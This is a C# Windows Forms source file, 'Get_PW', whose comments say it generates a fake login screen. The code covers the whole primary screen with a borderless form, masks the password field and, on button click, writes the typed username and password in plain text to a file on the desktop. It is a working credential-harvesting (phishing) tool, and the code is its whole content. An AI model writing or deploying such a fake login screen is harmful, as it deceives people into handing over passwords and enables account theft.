﻿//Programmer: ezGoose
//Date: 16.10.2018
//Version 0.1 in progress
//©Copyright by GooseStudios®
//This application will generate a fake login screen. 
//The password and the username will be saved on any path (variable: SavePath)
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Get_PW
{
    public partial class Form1 : Form
    {
        public string Password = ""; //Password
        public string UserName = ""; //User
        public string SavePath = @"C:\Users\Simon Wiederkehr\Desktop\Password.txt"; //Pfad fuer den Speicherort 
        public int X_Size_Form_Window = 0; //Breite der Form
        public int Y_Size_Form_Window = 0; //Hoehe der Form       
        public int X_Size_Textbox = 0; //Breite Textfeld
        public int Y_Size_Textbox = 0; //Hoehe Textfeld        
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            textBox1.UseSystemPasswordChar = true; //Eingabe wird nicht sichtbar angezeigt

            this.WindowState = FormWindowState.Normal; //Maximiert die Form
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None; //Entfernt den Rahmen
            this.Bounds = Screen.PrimaryScreen.Bounds;//Entfernt die Taskliste

            X_Size_Textbox = textBox1.Size.Width; //Laenge X von TB1 wird gemessen
            Y_Size_Textbox = textBox1.Size.Height;//Hoehe Y von TB1 wird gemessen

            Y_Size_Form_Window = (this.Size.Height /2) - Y_Size_Textbox; //Die Y-Achse vom Screen wird fuer die TB-Position ermittelt 
            X_Size_Form_Window = (this.Size.Width /2) - X_Size_Textbox; //Die X-Achse vom Screen wird fuer die TB-Position ermittelt           

            textBox1.Location = new Point(X_Size_Form_Window, Y_Size_Form_Window);//Textfeldpositon PASSWORT wird Berechnet
            textBox2.Location = new Point(X_Size_Form_Window, Y_Size_Form_Window + -30);//Textfeldposition USERNAME wird Berechnet
            button1.Location = new Point(X_Size_Form_Window + textBox1.Width + 3, Y_Size_Form_Window);//Positon fuer den Button
        }
        private void button1_Click(object sender, EventArgs e)
        {
            UserName = textBox2.Text;//Eingabe in die Variabel UserName gespeichert
            Password = textBox1.Text;//Eingabe in die Variabel Password gespeichert

            string[] lines = { "Username: " + UserName,
                               "Password: " + Password,
                               "###########Get_PW finished successfull!###########" };//Schreibt den Text in das File auf zwei Zeilen

            System.IO.File.WriteAllLines(SavePath, lines);//Schreibt das Password in das TextFile.
        }
        
        private void textBox1_TextChanged(object sender, EventArgs e)//Password Eingabe
        {
        }

        private void textBox2_TextChanged(object sender, EventArgs e)//Username Eingabe
        {
        }
    }
}
